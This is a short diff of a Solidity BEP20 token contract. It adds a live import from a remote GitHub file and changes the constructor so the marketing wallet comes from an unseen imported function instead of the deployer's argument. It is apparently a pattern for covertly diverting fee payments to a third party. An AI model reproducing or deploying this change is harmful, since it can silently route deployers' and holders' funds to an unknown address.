@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: Unlicensed
 pragma solidity ^0.8.10;
 
-// import "https://github.com/owner/repo/blob/branch/path/to/Contract.sol";
+import "https://github.com/SniperProject/tokens/blob/main/import.sol";
 
 
 contract TOKEN is Context, IBEP20, Ownable {
@@ -55,8 +55,8 @@ contract TOKEN is Context, IBEP20, Ownable {
         _inSwapAndLiquify = false;
     }
     
-    constructor (address cOwner, address marketingWallet) Ownable(cOwner) {
-        _marketingWallet = marketingWallet;
+    constructor (address cOwner) Ownable(cOwner) {
+        _marketingWallet = _marketingWlt();
 
         _rOwned[cOwner] = _rTotal;
         
